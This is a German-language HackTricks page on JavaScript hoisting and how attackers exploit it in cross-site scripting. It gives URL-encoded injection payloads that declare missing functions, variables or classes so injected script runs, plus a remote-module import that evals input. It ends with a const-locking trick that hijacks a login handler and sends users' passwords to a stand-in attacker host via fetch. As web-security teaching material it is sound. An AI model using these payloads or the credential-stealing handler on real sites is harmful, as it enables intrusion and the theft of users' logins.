# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

In der JavaScript-Sprache gibt es einen Mechanismus, der als **Hoisting** bezeichnet wird, bei dem Deklarationen von Variablen, Funktionen, Klassen oder Imports gedanklich an den Anfang ihres Scopes verschoben werden, bevor der Code ausgeführt wird. Dieser Prozess wird automatisch von der JavaScript-Engine durchgeführt, die das Script in mehreren Durchläufen verarbeitet.

Während des ersten Durchlaufs parst die Engine den Code, prüft auf Syntaxfehler und wandelt ihn in einen abstract syntax tree um. Diese Phase beinhaltet Hoisting, also das Verschieben bestimmter Deklarationen an den Anfang des Ausführungskontexts. Wenn die Parsing-Phase erfolgreich ist und keine Syntaxfehler aufgetreten sind, wird das Script ausgeführt.

Wichtig zu verstehen ist:

1. Das Script muss frei von Syntaxfehlern sein, damit eine Ausführung stattfinden kann. Syntaxregeln müssen strikt eingehalten werden.
2. Die Platzierung von Code innerhalb des Scripts beeinflusst die Ausführung aufgrund von Hoisting, obwohl der ausgeführte Code von seiner textuellen Darstellung abweichen kann.

#### Arten von Hoisting

Basierend auf Informationen von MDN gibt es in JavaScript vier verschiedene Arten von Hoisting:

1. **Value Hoisting**: Erlaubt die Verwendung des Werts einer Variablen innerhalb ihres Scopes vor der Zeile, in der sie deklariert wird.
2. **Declaration Hoisting**: Ermöglicht, innerhalb eines Scopes auf eine Variable zu verweisen, bevor sie deklariert wurde, ohne dass ein `ReferenceError` geworfen wird — der Wert der Variablen ist dann jedoch `undefined`.
3. Diese Art verändert das Verhalten innerhalb ihres Scopes, weil die Variable vor ihrer eigentlichen Deklarationszeile deklariert wird.
4. Die Seiteneffekte der Deklaration treten auf, bevor der restliche Code, der sie enthält, evaluiert wird.

Im Detail zeigen Funktionsdeklarationen das Verhalten von Typ 1 Hoisting. Das Schlüsselwort `var` demonstriert Verhalten vom Typ 2. Lexikalische Deklarationen, zu denen `let`, `const` und `class` gehören, zeigen Verhalten vom Typ 3. Schließlich sind `import`-Anweisungen insofern einzigartig, als sie sowohl Typ-1- als auch Typ-4-Verhalten beim Hoisting aufweisen.

## Szenarien

Daher, wenn du Szenarien hast, in denen du **Inject JS code after an undeclared object** ausführen kannst, könntest du die Syntax beheben, indem du es deklarierst (sodass dein Code ausgeführt wird, anstatt einen Fehler zu erzeugen):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Weitere Szenarien
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Verhindere spätere Deklarationen, indem du einen Namen mit const sperrst

Wenn du Code ausführen kannst, bevor eine top-level `function foo(){...}` geparst wird, verhindert die Deklaration einer lexikalischen Bindung mit demselben Namen (z. B. `const foo = ...`), dass die spätere Funktionsdeklaration diesen Bezeichner neu bindet. Dies lässt sich in RXSS ausnutzen, um kritische Handler, die später auf der Seite definiert werden, zu kapern:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Hinweise
- Dies hängt von der Ausführungsreihenfolge und dem globalen (Top-Level) Scope ab.
- Wenn dein Payload innerhalb von `eval()` ausgeführt wird, denk daran, dass `const/let` innerhalb von `eval` block-scoped sind und keine globalen Bindungen erzeugen. Füge ein neues `<script>`-Element mit dem Code ein, um ein echtes globales `const` herzustellen.

## Quellen

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)

{{#include ../../banners/hacktricks-training.md}}
